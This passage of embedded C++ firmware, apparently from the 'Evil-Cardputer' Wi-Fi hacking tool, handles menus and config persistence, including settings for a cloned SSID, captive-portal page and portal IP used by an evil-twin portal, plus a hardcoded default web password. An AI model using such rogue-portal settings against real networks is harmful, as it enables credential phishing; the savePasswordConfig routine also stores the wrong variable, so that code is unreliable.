    if (!found) {
        content += "startupImage=/img/" + paramValue + "\n";
    }

    // RÃ©Ã©crire tout le fichier de configuration
    file = SD.open(configFilePath, FILE_WRITE);
    if (file) {
        file.print(content);
        file.close();
    }
}


void loadStartupImageConfig() {
    File file = SD.open(configFilePath, FILE_READ);
    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupImage")) {
                selectedStartupImage = line.substring(line.indexOf('=') + 1);
                break;
            }
        }
        file.close();
    }
}

void toggleRandom() {
    randomOn = !randomOn;
    saveConfigParameter("randomOn", randomOn);  // Sauvegarder dans le fichier config
}


const char* const imageFiles[] PROGMEM = {
    "HiVenoumous.jpg", "infernoDemon.jpg", "InThePocket.jpg", "KNAX-EVILBAT.jpg",
    "neoEvilProject.jpg", "parkour.jpg", "R&MImIn.jpg", 
    "R&MPortal.jpg", "R&MSpace.jpg", "startup-cardputer-2.jpg", 
    "startup-cardputer.jpg", "superDemonHacker.jpg", "WhySoSerious.jpg", 
    "WifiDemon.jpg", "wifiHackingInTown.jpg", "afewmomentlater.jpg", "Evil_WiFi.jpg", 
    "hackers-group.jpg", "hackers-watchingU.jpg", "HackThePlanet.jpg", "HackThePlanet2.jpg", 
    "Hell's_Evil_Core.jpg", "pedro.jpg", "AlienWifiMaster.jpg", "beach.jpg", 
    "BigLivingCardputer.jpg", "CuteEvil.jpg", "cutevilprojects.jpg", "DAKKA-EVILBILLBOARD.jpg", 
    "DAKKA-EVILBILLBOARD2.jpg", "DAKKA-M5billboard.jpg", "DejaVu.jpg", "DemonHacker.jpg", 
    "EP2.jpg", "Evil-clown.jpg", "Evil-DeathHacker.jpg", "EvilBiohazard.jpg", 
    "EvilCoreDemon.jpg", "EvilHacking.jpg", "EvilInDark.jpg", "EvilM5hub.jpg", 
    "EvilMoto.jpg", "EvilProject-zombie.jpg", "EvilRickRoll.jpg", "HamsterSound.jpg", 
    "WiFi_Demon.jpg", "youshouldnotpass.jpg", "DAKKA-graph.jpg", "DAKKA-graph2.jpg", 
    "DiedDysentry.jpg", "EternalBlue.jpg", "IHateMonday.jpg", "WinBSOD.jpg", 
    "WinXp.jpg", "WinXp2.jpg", "DAKKA-EvilSkate.jpg", "DAKKA-EvilwithPhone.jpg" , "southpark.jpg", "southpark-2.jpg" , "southpark-all-town.jpg" , "LAIKACOMEHOME.jpg"
};

const char* const soundFiles[] PROGMEM = {
    "Thejocker-magictricks.mp3", "Deja-Vu.mp3", "car.mp3", "Fatality.mp3", 
    "DAKKA-EVILBASSCANNON.mp3", "electroswing.mp3", "evilmp3test.mp3", "DAKKA-EVILTEETH.mp3", 
    "ok.mp3", "DAKKA-EvilModem.mp3", "AWA.mp3", "uwu.mp3", 
    "fbi-open-up!.mp3", "I'M GONNA KILL YOU.mp3", "HamsterSound.mp3", "BITE MY SHINY METAL ASS.mp3", 
    "DAKKA-EVILVIRUS.mp3", "EvilHub.mp3", "GTA-wasted.mp3", "Hi-Venomous.mp3", 
    "I'M HOLDING A BOX OF TIC.mp3", "R&MImIn.mp3", "r2d2.mp3", "RickRoll.mp3", 
    "sample.mp3", "pickle_rick.mp3", "portal-gun-sound-effect.mp3", "show_me_what_you_got.mp3", 
    "you-will-respect-my-authoritah.mp3", "BRUH.mp3", "disqualified.mp3", "Mr-meeseeks.mp3", 
    "gandalf_shallnotpass.mp3", "hacktheplanet.mp3", "I'M HOLDING A BOX OF TIC TACS.mp3", "Q3a_quad_damage.mp3", 
    "kill-bill.mp3", "back-to-the-future.mp3", "a-few-moments-later-hd.mp3", "new element rick.mp3", 
    "pedro.mp3", "thats-what-she-said.mp3", "doh.mp3", "fifth-element-aziz-light.mp3", 
    "1-21GW.mp3", "DAKKA-EVILHEAT.mp3", "DAKKA-NewElement_rick.mp3", "you-will-respect-my-authoritah_1.mp3", 
    "psx.mp3", "takemymoney.mp3", "windows-xp-startup.mp3", "leeloo-dallas-multipass.mp3", 
    "wow-quest-complete.mp3", "skyrim_fus-ro-dah.mp3", "skyrim_level_up.mp3", "nani.mp3", 
    "among-us.mp3", "leroy-jenkins.mp3"
};


const size_t imageFilesCount = sizeof(imageFiles) / sizeof(imageFiles[0]);
const size_t soundFilesCount = sizeof(soundFiles) / sizeof(soundFiles[0]);

String getRandomImage() {
    if (imageFilesCount == 0) {
        return "/evil/img/startup-cardputer.jpg";  // Image par dÃ©faut
    }
    int randomIndex = random(imageFilesCount);
    char buffer[64];
    strcpy_P(buffer, (PGM_P)pgm_read_ptr(&imageFiles[randomIndex]));
    return String("/evil/img/") + buffer;
}

String getRandomSound() {
    if (soundFilesCount == 0) {
        return "/evil/audio/sample.mp3";  // Son par dÃ©faut
    }
    int randomIndex = random(soundFilesCount);
    char buffer[64];
    strcpy_P(buffer, (PGM_P)pgm_read_ptr(&soundFiles[randomIndex]));
    return String("/evil/audio/") + buffer;
}



bool imageMode = false; // Variable pour savoir si on est en mode image

void setStartupImage() {
    File root = SD.open("/evil/img");
    std::vector<String> images;
    
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".jpg")) {
                images.push_back(fileName);
            }
        }
        file.close();
    }
    root.close();

    if (images.size() == 0) {
        M5.Display.clear();
        M5.Display.println("No images found");
        delay(2000);
        return;
    }

    int currentImageIndex = 0;
    bool imageSelected = false;
    const int maxDisplayItems = 10;  // Nombre maximum d'Ã©lÃ©ments Ã  afficher
    int menuStartIndex = 0;
    bool needDisplayUpdate = true;
    bool imageMode = false;  // Variable pour savoir si on est en mode image directe

    enterDebounce();
    while (!imageSelected) {
        if (!imageMode) {
            // Mode Liste
            if (needDisplayUpdate) {
                M5.Display.clear();
                M5.Display.setCursor(5, 5);
                M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
                M5.Display.println("Select Startup Image:");

                for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < images.size(); i++) {
                    int itemIndex = menuStartIndex + i;
                    if (itemIndex == currentImageIndex) {
                        M5.Display.setTextColor(menuTextFocusedColor); // SÃ©lectionner la couleur
                    } else {
                        M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Non sÃ©lectionnÃ©
                    }
                    M5.Display.println(images[itemIndex]);
                }

                needDisplayUpdate = false; // RÃ©initialiser le besoin de mise Ã  jour
            }
        } else {
            // Mode Affichage direct des images
            if (needDisplayUpdate) {
                M5.Display.clear();
                String ThisImg = "/evil/img/" + images[currentImageIndex];
                drawImage(ThisImg.c_str());
                needDisplayUpdate = false; // Mise Ã  jour effectuÃ©e
            }
        }

        M5.update();
        M5Cardputer.update();

        // Navigation dans la liste ou les images
        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentImageIndex = (currentImageIndex - 1 + images.size()) % images.size();
            if (!imageMode) {
                // Mise Ã  jour de la liste
                if (currentImageIndex < menuStartIndex) {
                    menuStartIndex = currentImageIndex;
                } else if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
                    menuStartIndex = currentImageIndex - maxDisplayItems + 1;
                }
            }
            needDisplayUpdate = true;  // Mettre Ã  jour l'affichage
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentImageIndex = (currentImageIndex + 1) % images.size();
            if (!imageMode) {
                // Mise Ã  jour de la liste
                if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
                    menuStartIndex = currentImageIndex - maxDisplayItems + 1;
                } else if (currentImageIndex < menuStartIndex) {
                    menuStartIndex = currentImageIndex;
                }
            }
            needDisplayUpdate = true;  // Mettre Ã  jour l'affichage
        }

        // Basculer entre les modes Liste/Images avec la touche 'P'
        if (M5Cardputer.Keyboard.isKeyPressed('p')) {
            imageMode = !imageMode;  // Basculer le mode
            needDisplayUpdate = true;  // Forcer la mise Ã  jour
        }

        // SÃ©lection d'une image avec la touche EntrÃ©e
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            selectedStartupImage = images[currentImageIndex];
            saveStartupImageConfig(selectedStartupImage);
            String ThisImg = "/evil/img/" + images[currentImageIndex];
            drawImage(ThisImg.c_str());
            delay(1000);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.fillScreen(menuBackgroundColor);
            M5.Display.setCursor(5, M5.Display.height() / 2);
            M5.Display.print("Startup image set to\n" + selectedStartupImage);
            delay(1000);
            imageSelected = true;
        }

        // Sortir du mode sÃ©lection avec la touche Retour
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            imageSelected = true;
        }

        delay(150);  // Anti-rebond pour les touches
    }
}




void toggleSound() {
    inMenu = false;
    soundOn = !soundOn;  // Inverse l'Ã©tat du son

    // Sauvegarde le nouvel Ã©tat dans le fichier de configuration
    saveConfigParameter("soundOn", soundOn);
}

void toggleLED() {
    inMenu = false;
    ledOn = !ledOn;  // Inverse l'Ã©tat du LED

    // Sauvegarde le nouvel Ã©tat dans le fichier de configuration
    saveConfigParameter("ledOn", ledOn);
    
}

void brightness() {
  int currentBrightness = M5.Display.getBrightness();
  int minBrightness = 1;
  int maxBrightness = 255;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(menuTextUnFocusedColor);

  bool brightnessAdjusted = true;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200;  // DÃ©finir un dÃ©lai de debounce de 200 ms

  enterDebounce();

  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        currentBrightness = max(minBrightness, currentBrightness - 12);
        brightnessAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        currentBrightness = min(maxBrightness, currentBrightness + 12);
        brightnessAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        saveConfigParameter("brightness", currentBrightness);
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
    }

    if (brightnessAdjusted) {
      float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(50, M5.Display.height() / 2);
      M5.Display.print("Brightness: ");
      M5.Display.print((int)brightnessPercentage);
      M5.Display.println("%");
      M5.Display.setBrightness(currentBrightness);
      M5.Display.display();
      brightnessAdjusted = false;
    }
  }

  float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setCursor(5, M5.Display.height() / 2);
  M5.Display.print("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
  delay(1000);
}


void adjustVolume() {
    int currentVolume = M5Cardputer.Speaker.getVolume();  // RÃ©cupÃ¨re le volume actuel
    int minVolume = 0;  // Volume minimum
    int maxVolume = 255;  // Volume maximum

    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(menuTextUnFocusedColor);

    bool volumeAdjusted = true;
    unsigned long lastKeyPressTime = 0;
    const unsigned long debounceDelay = 200;  // DÃ©finir un dÃ©lai de debounce de 200 ms

    enterDebounce();

    while (true) {
        M5.update();
        M5Cardputer.update();

        if (millis() - lastKeyPressTime > debounceDelay) {
            if (M5Cardputer.Keyboard.isKeyPressed(',')) {
                currentVolume = max(minVolume, currentVolume - 12);
                volumeAdjusted = true;
                lastKeyPressTime = millis();
            } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
                currentVolume = min(maxVolume, currentVolume + 12);
                volumeAdjusted = true;
                lastKeyPressTime = millis();
            } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
                saveConfigParameter("volume", currentVolume);
                break;
            } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                inMenu = true;
                drawMenu();
                break;
            }
        }

        if (volumeAdjusted) {
            float volumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
            M5.Display.fillScreen(menuBackgroundColor);
            M5.Display.setCursor(50, M5.Display.height() / 2);
            M5.Display.print("Volume: ");
            M5.Display.print((int)volumePercentage);
            M5.Display.println("%");
            M5Cardputer.Speaker.setVolume(currentVolume);
            M5.Display.display();
            volumeAdjusted = false;
        }
    }

    float finalVolumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
    M5.Display.fillScreen(menuBackgroundColor);
    M5.Display.setCursor(50, M5.Display.height() / 2);
    M5.Display.print("Volume set to " + String((int)finalVolumePercentage) + "%");
    delay(1000);
}


void generateDefaultNick() {
    snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
}

void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println(F("Error when opening config.txt for reading (will create new)"));
       
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println(F("Error when opening config.txt for writing"));
  }
}

// Toggle GPS pins mode and persist
void applyGpsPinsForMode(int mode) {
  if (mode == 1) {
    gpsPinsMode = 1; gpsRxPin = 15; gpsTxPin = 13;

  } else if (mode == 0) {
    gpsPinsMode = 0; gpsRxPin = 1; gpsTxPin = -1;
  }
}

void toggleGpsPinsMode() {
  int newMode = (gpsPinsMode == 1) ? 0 : 1;
  applyGpsPinsForMode(newMode);
  saveConfigParameter("gps_pins_mode", gpsPinsMode);
  // Re-init GPS UART if possible
  cardgps.end();
  cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setCursor(5, M5.Display.height()/2);
  if (gpsPinsMode == 1) {
    M5.Display.print("GPS Pins set to 15/13");
  } else {
    M5.Display.print("GPS Pins set to 1/2");
  }
  delay(1000);
}


// Sauvegarde/maj de portal_file dans /config/config.txt
void savePortalFileConfig(const String &pathIn) {
  String portalPath = pathIn;
  if (!portalPath.startsWith("/evil/sites/")) portalPath = "/evil/sites/" + portalPath;

  if (!SD.exists(portalPath)) {
    Serial.println("savePortalFileConfig: portal not found on SD -> " + portalPath);
    return;
  }

  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);

  String content = "";
  bool found = false;

  File f = SD.open(configFilePath, FILE_READ);
  if (f) {
    while (f.available()) {
      String line = f.readStringUntil('\n');
      if (line.startsWith("portal_file=")) {
        content += "portal_file=" + portalPath + "\n";
        found = true;
      } else {
        content += line + "\n";
      }
    }
    f.close();
  }

  if (!found) content += "portal_file=" + portalPath + "\n";

  f = SD.open(configFilePath, FILE_WRITE);
  if (f) {
    f.print(content);
    f.close();
    Serial.println("portal_file saved: " + portalPath);
  } else {
    Serial.println(F("savePortalFileConfig: write error"));
  }
}

// Sauvegarde/maj de cloned_ssid dans /config/config.txt
void saveClonedSSIDConfig(const String &ssid) {
  if (ssid.length() == 0) {
    Serial.println(F("saveClonedSSIDConfig: empty SSID -> abort"));
    return;
  }

  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);

  String content = "";
  bool found = false;

  File f = SD.open(configFilePath, FILE_READ);
  if (f) {
    while (f.available()) {
      String line = f.readStringUntil('\n');
      if (line.startsWith("cloned_ssid=")) {
        content += "cloned_ssid=" + ssid + "\n";
        found = true;
      } else {
        content += line + "\n";
      }
    }
    f.close();
  }

  if (!found) content += "cloned_ssid=" + ssid + "\n";

  f = SD.open(configFilePath, FILE_WRITE);
  if (f) {
    f.print(content);
    f.close();
    Serial.println("cloned_ssid saved: " + ssid);
  } else {
    Serial.println(F("saveClonedSSIDConfig: write error"));
  }
}
// Sauvegarde/maj de cloned_ssid dans /config/config.txt
void savePasswordConfig(const String &pass) {
  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);

  String content = "";
  bool found = false;

  File f = SD.open(configFilePath, FILE_READ);
  if (f) {
    while (f.available()) {
      String line = f.readStringUntil('\n');
      if (line.startsWith("portal_password=")) {
        content += "portal_password=" + pass + "\n";
        found = true;
      } else {
        content += line + "\n";
      }
    }
    f.close();
  }

  if (!found) content += "portal_password=" + ssid + "\n";

  f = SD.open(configFilePath, FILE_WRITE);
  if (f) {
    f.print(content);
    f.close();
    Serial.println("portal_password saved: " + ssid);
  } else {
    Serial.println(F("portal_password: write error"));
  }
}

// Wrapper appelÃ© par le menu Settings
void saveCurrentPortalAndSSID() {
  Serial.println(F("Saving portal_file & cloned_ssid to config.txt"));
  savePortalFileConfig(selectedPortalFile);
  saveClonedSSIDConfig(clonedSSID);
  savePasswordConfig(captivePortalPassword);
  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setCursor(10, 10);
  M5.Display.println("Portal : " + selectedPortalFile.substring(12));
  M5.Display.println("SSID : " + clonedSSID);
  M5.Display.println("Password : " + captivePortalPassword);
  delay(2000);
  waitAndReturnToMenu("Config saved"); // mÃªme UX que le reste du projet
}



// Helper: retourne lâ€™IP sÃ©lectionnÃ©e
IPAddress getSelectedPortalIP() {
  return kCaptiveIPs[portalIpIndex];
}


void setCaptivePortalIP() {
  // simple liste Ã  2 choix
  const char* choices[2] = { "192.168.4.1", "172.0.0.1" };
  int currentIndexLocal = portalIpIndex;  // position courante
  bool selected = false;
  bool needDisplayUpdate = true;

  enterDebounce();

  while (!selected) {
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setCursor(5, 5);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("Select Captive IP:");

      for (int i = 0; i < 2; i++) {
        if (i == currentIndexLocal) {
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.println(String("  ") + choices[i]);
      }
      needDisplayUpdate = false;
    }

    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(';')) { // up
      currentIndexLocal = (currentIndexLocal - 1 + 2) % 2;
      needDisplayUpdate = true;
      delay(150);
    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // down
      currentIndexLocal = (currentIndexLocal + 1) % 2;
      needDisplayUpdate = true;
      delay(150);
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      portalIpIndex = currentIndexLocal;
      saveConfigParameter("portal_ip_sel", portalIpIndex); // persistance
      Serial.println("[CFG] Captive IP selection saved: " + String(kCaptiveIPStr[portalIpIndex]));
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(5, M5.Display.height()/2);
      M5.Display.print("Captive IP set to ");
      M5.Display.println(kCaptiveIPStr[portalIpIndex]);
      delay(1000);
      selected = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      // retour sans changement
      inMenu = true;
      drawMenu();
      return;
    }
  }
}


void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      String stringValue;
      int intValue = -1;
      bool boolValue = false;
      bool keyFound = false;

      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          stringValue = line.substring(line.indexOf('=') + 1);
          stringValue.trim();

          if (key == "brightness") {
            intValue = stringValue.toInt();
            M5.Display.setBrightness(intValue);
            Serial.println("Brightness restored to " + String(intValue));
          } else if (key == "volume") {
            intValue = stringValue.toInt();
            M5Cardputer.Speaker.setVolume(intValue);
            Serial.println("Volume restored to " + String(intValue));
          } else if (key == "ledOn" || key == "soundOn") {
            boolValue = (stringValue == "1");
            Serial.println(key + " restored to " + String(boolValue));
          } else if (key == "randomOn") {
            boolValue = (stringValue == "1");
            Serial.println("Random Startup restored to " + String(boolValue));
          } else if (key == "selectedTheme") {
            selectedTheme = stringValue;
            Serial.println("Selected Theme restored to " + stringValue);
          } else if (key == "wifi_ssid" && ssid.length() == 0) {
            stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
            ssid = ssid_buffer;
            Serial.println("WiFi SSID restored to " + stringValue);
          } else if (key == "wifi_password" && password.length() == 0) {
            stringValue.toCharArray(password_buffer, sizeof(password_buffer));
            password = password_buffer;
            Serial.println(F("WiFi Password restored"));
          } else if (key == "ssh_user" && ssh_user.length() == 0) {
            ssh_user = stringValue;
            Serial.println("SSH User restored to " + stringValue);
          } else if (key == "ssh_host" && ssh_host.length() == 0) {
            ssh_host = stringValue;
            Serial.println("SSH Host restored to " + stringValue);
          } else if (key == "ssh_password" && ssh_password.length() == 0) {
            ssh_password = stringValue;
            Serial.println(F("SSH Password restored"));
          } else if (key == "ssh_port") {
            intValue = stringValue.toInt();
            ssh_port = intValue;
            Serial.println("SSH Port restored to " + String(intValue));
          } else if (key == "tcp_host") {
            tcp_host = stringValue;
            Serial.println("TCP host restored to " + stringValue);
          } else if (key == "tcp_port") {
            intValue = stringValue.toInt();
            tcp_port = intValue;
            Serial.println("TCP Port restored to " + String(intValue));
          } else if (key == "baudrate_gps") {
            intValue = stringValue.toInt();
            baudrate_gps = intValue;
            Serial.println("GPS Baudrate restored to " + String(intValue));
          } else if (key == "gps_pins_mode") {
            intValue = stringValue.toInt();
            gpsPinsMode = (intValue == 0 || intValue == 1) ? intValue : -1;
            if (gpsPinsMode == 1) {
              // ADV mapping 15/13 + power on
              gpsRxPin = 15;
              gpsTxPin = 13;
              Serial.println("GPS pins restored: 15/13 (ADV)");
            } else if (gpsPinsMode == 0) {
              // Normal Cardputer mapping 1/2
              gpsRxPin = 1;
              gpsTxPin = -1;
              Serial.println("GPS pins restored: 1/2 (Cardputer)");
            } else {
              Serial.println("GPS pins mode: auto (by board)");
            }
          } else if (key == "webpassword") {
            accessWebPassword = stringValue;
            Serial.println(F("Web password restored"));
          } else if (key == "discordWebhookURL") {
            discordWebhookURL = stringValue;
            Serial.println("Discord Webhook URL restored to " + stringValue);
          } else if (key == "llm_host") {
            llmHost = stringValue;
            Serial.println("LLM Host restored to " + stringValue);
          } else if (key == "llm_port") {
            intValue = stringValue.toInt();
            llmhttpsPort = intValue;
            Serial.println("LLM Port restored to " + String(intValue));
          } else if (key == "llm_api_path") {
            llmapiPath = stringValue;
            Serial.println("LLM API Path restored to " + stringValue);
          } else if (key == "llm_user") {
            llmUser = stringValue;
            Serial.println("LLM Username restored to " + stringValue);
          } else if (key == "llm_pass") {
            llmPass = stringValue;
            Serial.println(F("LLM Password restored"));
          } else if (key == "llm_model") {
            llmModel = stringValue;
            Serial.println("LLM Model restored to " + stringValue);
          } else if (key == "llm_max_tokens") {
            intValue = stringValue.toInt();
            llmMaxTokens = intValue;
            Serial.println("LLM Max Tokens restored to " + String(intValue));
          } else if (key == "evilChatNickname") {
            stringValue.toCharArray(currentNick, sizeof(currentNick));
            Serial.println("Nickname restored to " + String(currentNick));
          } else if (key == "portal_file") {
            String v = stringValue;
            if (!v.startsWith("/evil/sites/")) v = "/evil/sites/" + v;
            if (SD.exists(v)) {
              selectedPortalFile = v;
              Serial.println("Portal file restored to " + selectedPortalFile);
            } else {
              Serial.println("portal_file not found on SD, keep: " + selectedPortalFile);
            }
          } else if (key == "cloned_ssid") {
            clonedSSID = stringValue;
            Serial.println("Cloned SSID restored to " + clonedSSID);
          } else if (key == "portal_password") {
            captivePortalPassword = stringValue;
            Serial.println("Portal password restored to " + captivePortalPassword);
          } else if (key == "portal_ip_sel") {
            int intValue = stringValue.toInt();
            if (intValue < 0 || intValue > 1) intValue = 0; // garde-fou
            portalIpIndex = intValue;
            Serial.println("Captive IP selection restored: " + String(kCaptiveIPStr[portalIpIndex]));
          } else if (key == "startatboot") {
            String v = stringValue; v.toLowerCase();
            boolValue = (v == "1" || v == "true" || v == "yes" || v == "on");
            startAtBootFlag = boolValue;
            Serial.println("StartAtBoot restored to " + String(startAtBootFlag ? "true" : "false"));
          } else if (key == "casetostartatboot") {
            intValue = stringValue.toInt();
            caseToStartAtBoot = intValue;
            Serial.println("CaseToStartAtBoot restored to " + String(caseToStartAtBoot));
          } else if (key == "cpu_freq") {
           int selectedFreq = stringValue.toInt();
           setCpuFrequencyMhz(selectedFreq);
           Serial.println("CPU Frequency restored to " + String(selectedFreq));
          } else if (key == "boot_countdown") {
            intValue = stringValue.toInt();
            if (intValue < 0) intValue = 0;
            if (intValue > 30) intValue = 30; // clamp
            bootCountdownSeconds = intValue;
            Serial.println("Boot countdown restored to " + String(bootCountdownSeconds) + " s");
          }
          keyFound = true;
          break;
        }
      }
      
      configFile.close();

      // Defaults si clÃ© non trouvÃ©e
      if (!keyFound) {
        Serial.println("Key not found in config, using default for " + key);
        if (key == "brightness") {
          M5.Display.setBrightness(defaultBrightness);
        } else if (key == "volume") {
          M5Cardputer.Speaker.setVolume(180);
        } else if (key == "ledOn") {
          boolValue = false;
        } else if (key == "soundOn") {
          boolValue = false;
        } else if (key == "randomOn") {
          boolValue = false;
        } else if (key == "baudrate_gps") {
          baudrate_gps = 115200;
        } else if (key == "gps_pins_mode") {
          gpsPinsMode = -1; // keep auto by board
        } else if (key == "webpassword") {
          accessWebPassword = "7h30th3r0n3";
        } else if (key == "discordWebhookURL") {
          discordWebhookURL = "";
        } else if (key == "llm_host") {
          llmHost = "7h30th3r0n3.com";
        } else if (key == "llm_port") {
          llmhttpsPort = 443;
        } else if (key == "llm_api_path") {
          llmapiPath = "/evilOllama/api/generate";
        } else if (key == "llm_user") {
          llmUser = "";
        } else if (key == "llm_pass") {
          llmPass = "";
        } else if (key == "llm_model") {
          llmModel = "tinyllama";
        } else if (key == "llm_max_tokens") {
          llmMaxTokens = 256;
        } else if (key == "evilChatNickname") {
          snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
          currentNick[sizeof(currentNick) - 1] = '\0';
          Serial.println("Default Nickname generated: " + String(currentNick));
        } else if (key == "portal_file") { 
          selectedPortalFile = "/sites/normal.html"; 
        } else if (key == "cloned_ssid") { 
          clonedSSID = "Evil-Cardputer"; 
        } else if (key == "portal_password") { 
          captivePortalPassword = ""; 
        } else if (key == "portal_ip_sel") {
          portalIpIndex = 0; // dÃ©faut = 192.168.4.1
        }
      }

      // Application boolÃ©ens
      if (key == "ledOn") {
        ledOn = boolValue;
      } else if (key == "soundOn") {
        soundOn = boolValue;
      } else if (key == "randomOn") {
        randomOn = boolValue;
      }
    } else {
      Serial.println(F("Error opening config.txt"));
    }
  } else {
    Serial.println(F("Config file not found, using default values"));

    // RÃ©pliques dÃ©faut en l'absence de fichier
    if (key == "brightness") {
      M5.Display.setBrightness(defaultBrightness);
    } else if (key == "volume") {
      M5Cardputer.Speaker.setVolume(180);
    } else if (key == "ledOn") {
      ledOn = false;
    } else if (key == "soundOn") {
      soundOn = false;
    } else if (key == "randomOn") {
      randomOn = false;
    } else if (key == "baudrate_gps") {
      baudrate_gps = 115200;
    } else if (key == "gps_pins_mode") {
      gpsPinsMode = -1;
    } else if (key == "webpassword") {
      accessWebPassword = "7h30th3r0n3";
    } else if (key == "discordWebhookURL") {
      discordWebhookURL = "";
    } else if (key == "llm_host") {
      llmHost = "";
    } else if (key == "llm_port") {
      llmhttpsPort = 443;
    } else if (key == "llm_api_path") {
      llmapiPath = "/evilOllama/api/generate";
    } else if (key == "llm_user") {
      llmUser = "";
    } else if (key == "llm_pass") {
      llmPass = "";
    } else if (key == "llm_model") {
      llmModel = "tinyllama";
    } else if (key == "llm_max_tokens") {
      llmMaxTokens = 256;
    } else if (key == "evilChatNickname") {
      snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
      currentNick[sizeof(currentNick) - 1] = '\0';
      Serial.println("Default Nickname generated: " + String(currentNick));
    } else if (key == "portal_file") { 
      selectedPortalFile = "/sites/normal.html"; 
    } else if (key == "cloned_ssid") { 
      clonedSSID = "Evil-Cardputer"; 
    } else if (key == "portal_password") { 
      captivePortalPassword = ""; 
    }else if (key == "portal_ip_sel") {
      portalIpIndex = 0; // dÃ©faut = 192.168.4.1
    }
  }
}



// Helper function for theming
int getColorValue(const char* colorName) {
  // All TFT_[COLOR] colors defined by M5stack
  if (strcmp(colorName, "TFT_BLACK") == 0) return TFT_BLACK;
  if (strcmp(colorName, "TFT_NAVY") == 0) return TFT_NAVY;
  if (strcmp(colorName, "TFT_DARKGREEN") == 0) return TFT_DARKGREEN;
  if (strcmp(colorName, "TFT_DARKCYAN") == 0) return TFT_DARKCYAN;
  if (strcmp(colorName, "TFT_MAROON") == 0) return TFT_MAROON;
  if (strcmp(colorName, "TFT_PURPLE") == 0) return TFT_PURPLE;
  if (strcmp(colorName, "TFT_OLIVE") == 0) return TFT_OLIVE;
  if (strcmp(colorName, "TFT_LIGHTGREY") == 0) return TFT_LIGHTGREY;
  if (strcmp(colorName, "TFT_DARKGREY") == 0) return TFT_DARKGREY;
  if (strcmp(colorName, "TFT_BLUE") == 0) return TFT_BLUE;
  if (strcmp(colorName, "TFT_GREEN") == 0) return TFT_GREEN;
  if (strcmp(colorName, "TFT_CYAN") == 0) return TFT_CYAN;
  if (strcmp(colorName, "TFT_RED") == 0) return TFT_RED;
  if (strcmp(colorName, "TFT_MAGENTA") == 0) return TFT_MAGENTA;
